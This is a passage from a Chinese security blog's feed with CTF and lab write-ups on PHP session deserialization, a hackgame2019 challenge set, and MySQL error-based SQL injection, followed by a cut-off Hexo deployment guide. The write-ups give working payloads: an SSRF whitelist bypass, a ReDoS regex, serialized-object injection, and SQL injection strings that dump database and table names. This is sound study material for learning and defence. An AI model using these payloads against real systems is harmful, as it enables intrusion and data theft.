$_GET[&#39;ryat&#39;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;foo2.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">&#x2F;&#x2F;or session.serialize_handler set to php in php.ini </span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class ryat &#123;</span><br><span class="line">var $hi;</span><br><span class="line"></span><br><span class="line">function __wakeup() &#123;</span><br><span class="line">echo &#39;hi&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function __destruct() &#123;</span><br><span class="line">echo $this-&gt;hi;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当访问 foo1.php 时，提交数据如下：</p><pre><code>foo1.php?ryat=|O:4:&quot;ryat&quot;:1:&#123;s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;&#125;</code></pre><p>脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 <code>__wakeup</code> 方法和 <code>__destruct</code> 方法</p><p><strong>当 session.auto_start＝On 时</strong></p><p>当配置选项 <code>session.auto_start＝On</code>，会自动注册 Session 会 话，因为该过程是发生在脚本代码执行前，所以在脚本中设定 的包括序列化处理器在内的 session 相关配选项的设置是不起 作用的，因此一些需要在脚本中设置序列化处理器配置的程序 会在 <code>session.auto_start＝On</code> 时，销毁自动生成的 Session 会 话，然后设置需要的序列化处理器，再调用 session_start() 函 数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中 设置的不同，就会出现安全问题,如下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;foo.php</span><br><span class="line"></span><br><span class="line">if (ini_get(&#39;session.auto_start&#39;)) &#123;</span><br><span class="line">session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;];</span><br></pre></td></tr></table></figure><p>当第一次访问该脚本，并提交数据如下：</p><pre><code>foo.php?ryat=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></pre><p>脚本会按照 php_serialize 处理器的序列化格式存储数据：</p><pre><code>a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code></pre><p>当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）</p><p>这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。</p><h3 id="Jarvisoj上的一道题"><a href="#Jarvisoj上的一道题" class="headerlink" title="Jarvisoj上的一道题"></a>Jarvisoj上的一道题</h3><p>具体参考：<a href="http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/">http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackgame2019部分题目writeup</title>
      <link href="2019/10/26/hackgame-wp/"/>
      <url>2019/10/26/hackgame-wp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了hackgame2019部分题目的writeup!</p><a id="more"></a><h2 id="白与夜"><a href="#白与夜" class="headerlink" title="白与夜"></a>白与夜</h2><p>将图片down下来，用Stegsolve打开</p><p><img src="/2019/10/26/hackgame-wp/20191026231318.png"></p><h2 id="信息安全-2077"><a href="#信息安全-2077" class="headerlink" title="信息安全 2077"></a>信息安全 2077</h2><p>抓到post包，将<code>If-Unmodified-Since</code>改成2077之后</p><p><img src="/2019/10/26/hackgame-wp/20191026231622.png"></p><h2 id="宇宙终极问题"><a href="#宇宙终极问题" class="headerlink" title="宇宙终极问题"></a>宇宙终极问题</h2><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p><a href="https://www.huxiu.com/article/317268.html">Google一下</a>就知道了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give me 3 integers, x, y, and z, such that</span><br><span class="line">x^3 + y^3 + z^3 &#x3D; 42</span><br></pre></td></tr></table></figure><pre><code>42 = (-80538738812075974)³  + 80435758145817515³ + 12602123297335631³</code></pre><h3 id="Everything"><a href="#Everything" class="headerlink" title="Everything"></a>Everything</h3><p>还是<a href="https://www.alpertron.com.ar/FCUBES.HTM">Google一下</a>就出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Since you already know the Answer to Everything, could you give me 8 integers, a, b, c, d, i, j, k and l, such that</span><br><span class="line">a^3 + b^3 + c^3 + d^3 &#x3D; i^2 + j^2 + k^2 + l^2 &#x3D; random_prime(2^256) * random_prime(2^256) &#x3D; 2696202144446753329066703065018205556554521178594549469403210892619232428137856502450273212093761946616284001286324448308517304228289606401398114121525169</span><br></pre></td></tr></table></figure><p>两个求解页面：<a href="https://www.alpertron.com.ar/FSQUARES.HTM">四平方</a> <a href="https://www.alpertron.com.ar/FCUBES.HTM">四立方</a></p><p><img src="/2019/10/26/hackgame-wp/20191030231320.png"></p><p><img src="/2019/10/26/hackgame-wp/20191030231450.png"></p><h3 id="Last-question"><a href="#Last-question" class="headerlink" title="Last question"></a>Last question</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The last question is beyond Everything, but still you can try to solve it, by giving me 2 integers, p and q, such that</span><br><span class="line">p^2 + q^2 &#x3D; randint(2^256) &#x3D; 16803108896636432087843597567919881272571173380668774706039248650282590651651</span><br></pre></td></tr></table></figure><p>这道题就可以多试几次，不可能所有的随机数都可以被分成4个数的平方之和，有的只能分成两个</p><h2 id="网页读取器"><a href="#网页读取器" class="headerlink" title="网页读取器"></a>网页读取器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, send_from_directory</span><br><span class="line">import requests  # well, requests is designed for humans, and I like it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">whitelist_hostname &#x3D; [&quot;example.com&quot;,</span><br><span class="line">                     &quot;www.example.com&quot;]</span><br><span class="line">whitelist_scheme &#x3D; [&quot;http:&#x2F;&#x2F;&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_hostname(url):</span><br><span class="line">    for i in whitelist_scheme:</span><br><span class="line">        if url.startswith(i):</span><br><span class="line">            url &#x3D; url[len(i):]  # strip scheme</span><br><span class="line">            url &#x3D; url[url.find(&quot;@&quot;) + 1:]  # strip userinfo## 截取要@后面的</span><br><span class="line">            if not url.find(&quot;&#x2F;&quot;) &#x3D;&#x3D; -1:</span><br><span class="line">                url &#x3D; url[:url.find(&quot;&#x2F;&quot;)]  # strip parts after authority## 截取要&#x2F;前的</span><br><span class="line">            if not url.find(&quot;:&quot;) &#x3D;&#x3D; -1:</span><br><span class="line">                url &#x3D; url[:url.find(&quot;:&quot;)]  # strip port要:前的</span><br><span class="line">            if url not in whitelist_hostname:</span><br><span class="line">                return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url))</span><br><span class="line">            return (True, &quot;ok&quot;)</span><br><span class="line">    return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;request&quot;)</span><br><span class="line">def req_route():</span><br><span class="line">    url &#x3D; request.args.get(&#39;url&#39;)</span><br><span class="line">    status, msg &#x3D; check_hostname(url)</span><br><span class="line">    if status is False:</span><br><span class="line">        # print(msg)</span><br><span class="line">        return msg</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; requests.get(url, timeout&#x3D;2)</span><br><span class="line">        if not r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code)</span><br><span class="line">        return r.text</span><br><span class="line">    except requests.Timeout:</span><br><span class="line">        return &quot;We tried our best, but it just timeout.&quot;</span><br><span class="line">    except requests.RequestException:</span><br><span class="line">        return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;source&quot;)</span><br><span class="line">def get_source():</span><br><span class="line">    return send_from_directory(&quot;&#x2F;static&#x2F;&quot;, &quot;app.py&quot;, as_attachment&#x3D;True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, 8000, debug&#x3D;False)</span><br></pre></td></tr></table></figure><p>这道题主要的点就是 URL 的 parser 和 requester 的不一致性导致的意料之外的 SSRF 问题</p><h3 id="关于URI-统一资源标志符"><a href="#关于URI-统一资源标志符" class="headerlink" title="关于URI(统一资源标志符)"></a>关于URI(统一资源标志符)</h3><p>URL（统一资源定位符）是 URI 最常见的一种形式，而 URL 就是我们常说的「网址」</p><p>URI 的语法大概长成下面这个样子：</p><pre><code>scheme:[//authority]path[?query][#fragment]</code></pre><p>其中用 [] 围住的是可选的。然后我们来看一下各部分：</p><ol><li>协议 (scheme)：访问资源使用的协议，比如说 http, https 之类的。</li><li>来源 (authority)：来源中包含了主机名，和可选的用户信息和端口号，比如 <code>www.ustc.edu.cn</code>, <code>admin:admin@www.example.com:2333</code>（使用用户名为 admin，密码为 admin，访问 <a href="http://www.example.com/">www.example.com</a> 的 2333 端口获取资源）。</li><li>路径 (path)：比如说 <code>/cgi-bin</code>, <code>/a/b/c/d/e/f/g</code> 等，有等级 (hierarchical) 关系。</li><li>查询 (query)：没有等级 (non-hierarchical) 关系的数据。一般来说，查询中的参数会被网站的后端获取到，然后进行对应的处理，比如 <code>?q=keyword</code>，<code>?a=1&amp;b=2</code>。</li><li>片段 (fragment)：指向一个更低级别的资源，例如 <code>#Examples</code>，浏览器访问时会滚动到 id 为 Examples 的标签。如果写过单页面应用 (SPA) 的同学可能会知道，一些框架处理路由时使用 hash 模式，这里的 hash 就是片段开头的 <code>#</code><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3></li></ol><p>如果我们构造一个奇怪的 URL 会怎么样？如果我们能想办法让 <code>check_hostname</code> 解释出主机名为 <code>example.com</code> 的同时，让 <code>requests.get()</code> 实际访问我们想要的地址，那就成功了。</p><p>预期解就使用到了 fragment（当然用 <code>?</code> 也是可以的）。现有的 requester 都会直接忽略掉 <code>#</code> 后面的东西，毕竟这对请求网站内容是没有意义的。但这里的代码没有对 <code>#</code> 进行任何处理，而且会粗暴地忽略掉 <code>@</code> 前面的所有内容</p><p>当时做这道题一直想的是下面这个思路，试了好久才成功</p><pre><code>http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的</code></pre><p>所以这道题的payload:</p><pre><code>http://web1/flag#@example.com或http://web1/flag?@example.com</code></pre><h2 id="达拉崩吧大冒险"><a href="#达拉崩吧大冒险" class="headerlink" title="达拉崩吧大冒险"></a>达拉崩吧大冒险</h2><p>这题我第一时间想到的可能是注入相关的东西，因此抓包改包，最后也没做出来</p><h3 id="一个简单的整数溢出漏洞"><a href="#一个简单的整数溢出漏洞" class="headerlink" title="一个简单的整数溢出漏洞"></a>一个简单的整数溢出漏洞</h3><p>观察到 WebSocket 的 JavaScript 代码中，向服务器通信的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#send&quot;).click(</span><br><span class="line">    function () &#123;</span><br><span class="line">        let v &#x3D; $(&quot;#input option:selected&quot;).val();</span><br><span class="line">        addMsg(&quot;我&quot;, opts[parseInt(v)]);</span><br><span class="line">        ws.send(v)</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>在“料理大市场”买鸡的时候，bp抓包当 <code>v = -1900000000000000000</code> 时候，则会发生大整数溢出，并使得自己的攻击力溢出，而后挑战恶龙即可。</p><p>这个是真的想不到，所以说以后做题还要放开思维</p><h2 id="Happy-LUG"><a href="#Happy-LUG" class="headerlink" title="Happy LUG"></a>Happy LUG</h2><p>直接用Chrome或Firefox访问</p><pre><code>😂.hack.ustclug.org</code></pre><p>会自动转成</p><pre><code>xn--g28h.hack.ustclug.org</code></pre><p>这里是 <code>Unicode</code>的一个域名编码方案 <code>Punycode</code>，<code>😂</code>会被编码成 <code>xn--g28h</code></p><p>另一个考点就是 DNS 记录。一个域名除了可以指向一个或多个 IP 地址（A 或 AAAA 记录）之外还可以包含其他信息，例如指向另一个域名（CNAME 记录），指示接收邮件的服务器（MX 记录），或者提供任意字符串（TXT 记录）等等</p><p>本道题就用了域名指向字符串这一点，可以使用nslookup或者dig</p><pre><code>dig TXT xn--g28h.hack.ustclug.org +noidnoutnslookup -q=txt xn--g28h.hack.ustclug.org</code></pre><p><img src="/2019/10/26/hackgame-wp/20191031165614.png"></p><h2 id="正则验证器"><a href="#正则验证器" class="headerlink" title="正则验证器"></a>正则验证器</h2><p>这题考察的是正则回溯的知识点</p><p>可参见<a href="https://en.wikipedia.org/wiki/ReDoS">wiki</a></p><p>这里有个<a href="https://regex101.com/">测试正则的平台</a></p><p>这里说下正则表达式<code>*?+</code>的用法</p><ol><li><code>+</code> 号代表前面的字符必须至少出现一次（1次或多次）</li><li><code>*</code> 号代表字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）</li><li><code>?</code> 问号代表前面的字符最多只可以出现一次（0次、或1次）</li></ol><p>可以直接利用</p><pre><code>Regex: (a*)*$String: aaaaaaaaaaaaaaaaaaaaaaab</code></pre><p>这个正则由于失败时回溯的存在，每增加一个 a 就会使匹配时间翻一倍</p><h2 id="三教奇妙夜"><a href="#三教奇妙夜" class="headerlink" title="三教奇妙夜"></a>三教奇妙夜</h2><p>这题考察的是视频提取不同的帧的操作</p><p>OpenCV 是一个计算机视觉库。我们这里使用 OpenCV 的 Python 接口。其实只需要知道这么几个 API 就可以了：</p><ol><li><code>file = cv2.VideoCapture(filename):</code> 打开一个视频文件。</li><li><code>file.read() -&gt; ret, frame:</code> 读取这个视频文件的一帧，返回状态与对应的帧。</li><li><code>cv2.absdiff(frame1, frame2):</code> 比较两个帧，返回一个 Array。</li><li><code>array.sum():</code> 求 Array 的和。<br>此外为了显示图片，可以使用 <code>matplotlib，from matplotlib import pyplot as plt</code> 然后 <code>plt.imshow(frame)</code> 和 <code>plt.show()</code> 就行。完整的代码如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">from matplotlib import pyplot as plt</span><br><span class="line"></span><br><span class="line">file &#x3D; cv2.VideoCapture(&quot;output-1.mp4&quot;)</span><br><span class="line">ret, preframe &#x3D; file.read()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  ret, frame &#x3D; file.read()</span><br><span class="line">  if ret &#x3D;&#x3D; 0:</span><br><span class="line">    break</span><br><span class="line">  diff &#x3D; cv2.absdiff(preframe, frame).sum()</span><br><span class="line">  if diff &gt; 10000:</span><br><span class="line">    print(&quot;diff: &#123;&#125;&quot;.format(diff))</span><br><span class="line">    plt.imshow(frame)</span><br><span class="line">    plt.show()</span><br><span class="line">  preframe &#x3D; frame</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> hackgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql报错注入学习</title>
      <link href="2019/10/25/mysql-wrong-injection/"/>
      <url>2019/10/25/mysql-wrong-injection/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了sql注入中的报错注入！</p><a id="more"></a><h2 id="什么是报错注入"><a href="#什么是报错注入" class="headerlink" title="什么是报错注入?"></a>什么是报错注入?</h2><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><p>主要分为下面几类：</p><ol><li>BigINT数据类型溢出</li><li>Xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>空间数据类型函数错误</li></ol><h2 id="BigINT数据类型溢出"><a href="#BigINT数据类型溢出" class="headerlink" title="BigINT数据类型溢出"></a>BigINT数据类型溢出</h2><p>这里可以看到mysql是怎么处理整形的</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025200205.png"></p><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025200633.png"></p><p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025201535.png"></p><p>同理，利用exp函数也会产生类似的溢出错误</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025201649.png"></p><p><strong>注入姿势：</strong></p><pre><code>select exp(~(select*from(select ****)x));</code></pre><p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025204044.png"></p><p>而在mysql&gt;5.5.53时，则不能返回查询结果</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025204127.png"></p><p>此外，报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure><h2 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h2><p>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。</p><p>extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210140.png"></p><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210332.png"></p><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：<br>    select count(*) from test group by concat(version(),floor(rand(0)*2));</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025210332.png"></p><p><strong>rand()函数：</strong>返回一个 0 到 1 之间的浮点数，如果给定了整数常量 N，即 rand(N)，N 将会被用作种子值，并产生可重复的值的序列</p><p>**floor函数:**返回小于等于该值的最大整数</p><p>*<em>COUNT()函数:**返回匹配指定条件的行数,COUNT(</em>) 函数返回表中的记录数</p><p>报错需要count(*)，rand()、group by，三者缺一不可</p><p>mysql的官方文档中对 rand() 函数有特殊的说明：</p><p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p><p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于<code>Duplicate entry &#39;…&#39; for key &#39;group_key&#39;</code>的错误。</p><p>另外，经过测试</p><p>rand()会随机报错，就是有可能报错，有的时候不会，</p><p>rand(0)肯定会报错，rand(1)则一定不会报错。</p><p>所以要让他报错的话直接用rand(0)</p><p>原理请参见：<a href="http://heartsky.info/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%20MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">http://heartsky.info/2016/12/04/几种常见的%20MySQL%20报错注入/</a></p><p>以sqli-labs中的Less-5为例</p><p><strong>爆数据库</strong></p><pre><code>?id=1&#39; union select count(*),2,3 from users group by concat(database(),floor(rand(0)*2))%23</code></pre><p><img src="/2019/10/25/mysql-wrong-injection/20191025212947.png"></p><p><strong>爆表和字段</strong></p><pre><code>?id=1&#39; union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,&#39;:&#39;,table_name) from information_schema.tables limit 1,1),floor(rand(0)*2))%23</code></pre><h2 id="一些特性"><a href="#一些特性" class="headerlink" title="一些特性"></a>一些特性</h2><h3 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h3><p>mysql列名重复会报错，我们利用name_const来制造一个列：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025213830.png"></p><p>根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p><p>利用这个特性加上join函数(知道表名)可以爆列名：</p><p><img src="/2019/10/25/mysql-wrong-injection/20191025214442.png"></p><p><img src="/2019/10/25/mysql-wrong-injection/20191025214633.png"></p><p>这样累加的方式就可以爆出所有的字段</p><h3 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h3><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.5.47</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;b&#96;.&#96;version()&#96; from ((select &#39;5.5.47&#39; AS &#96;version()&#96; from dual) &#96;b&#96;))&#39; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;a&#96;.&#96;version()&#96; from ((select version() AS &#96;version()&#96;) &#96;a&#96;))&#39; value found during parsing</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><br><a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">https://hatboy.github.io/2018/08/28/MySQL报错注入/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客部署到阿里云</title>
      <link href="2019/10/19/hexo-deploy-aliyun/"/>
      <url>2019/10/19/hexo-deploy-aliyun/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了如何将hexo博客部署到自己的服务器上，github实在是太慢了2333333……</p><h2 id="服务器安装必要环境"><a href="#服务器安装必要环境" class="headerlink" title="服务器安装必要环境"></a>服务器安装必要环境</h2><p><strong>安装git</strong></p><pre><code>apt-get install git</code></pre><p><strong>安装nginx(宝塔一键安装)</strong></p><pre><code>apt-get install nginx</code></pre><p>本地环境配置就不介绍了</p><h2 id="配置ssh-仓库-网站根目录"><a href="#配置ssh-仓库-网站根目录" class="headerlink" title="配置ssh,仓库,网站根目录"></a>配置ssh,仓库,网站根目录</h2><p><strong>添加用户</strong></p><pre><code>useradd git    //添加git用户passwd git    //为git用户设个密码</code></pre><p><strong>配置ssh</strong></p><pre><code>cd /home</code></pre><p>如果没有git文件夹创建一个</p><pre><code>mkdir /home/git</code></pre><p>有的话跳过</p><pre><code>su git    //切换git用户mkdir /home/git/.ssh    touch /home/git/.ssh/authorized_keysvi /home/git/.ssh/authorized_keys</code></pre><p>里面内容填本机里得对应用户目录下的<code>.ssh/id_rsa.pub</code>的内容</p><p>配置完可以ssh登陆一下</p><p><strong>配置仓库</strong></p><p>可以在<code>/home/git/</code>下新建一个blog.git文件夹，用于建立git仓库</p><pre><code>git init --bare blog.git</code></pre><p>建立钩子(本地部署到服务器会执行)</p><pre><code>vi ~/blog.git/hooks/post-receive</code></pre><p>填入以下内容，work-tree是网站目录，git-dir是git仓库目录</p><pre><code>git --work-tree=/home/git/hexo --git-dir=/home/git/blog.git checkout -f</code></pre><p>建立hexo文件夹</p><pre><code>mkdir /home/git/hexo</code></pre><p>将git文件夹所有者更改为git用户，并将用户目录权限改为775，即允许git用户写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git git&#x2F;&#x2F;权限问题可能会是报错的主要原因</span><br><span class="line">chmod -R git 775</span><br></pre></td></tr></table></figure><img src="/2019/10/19/hexo-deploy-aliyun/TIM截图20200120212501.png" style="zoom:50%;"><p><strong>配置网站根目录</strong></p><pre><code>nginx -t //查看nginx配置文件位置</code></pre><p><img src="/2019/10/19/hexo-deploy-aliyun/20191019172010.png"></p><pre><code>cat /www/server/nginx/conf/nginx.conf</code></pre><img src="/2019/10/19/hexo-deploy-aliyun/20191019172243.png" style="zoom: 67%;">    <p>没有发现有和网站相关的，但是发现了包含了文件</p><pre><code>cd /www/server/panel/vhost/nginx/ls</code></pre><p>发现都是网站的配置文件，我用宝塔一键创建的网站(不知道为啥源码不能放在<code>/www/wwwroot</code>下)，所以里面有<code>网站.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    server_name 你的服务器地址;</span><br><span class="line">    index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    root &#x2F;home&#x2F;git&#x2F;hexo;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>宝塔可以一键修改目录</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>更改本地<code>_config.yml</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    aliyun: git@你的服务器地址:&#x2F;home&#x2F;git&#x2F;blog.git,master</span><br></pre></td></tr></table></figure><p>然后<br>    hexo g<br>    hexo 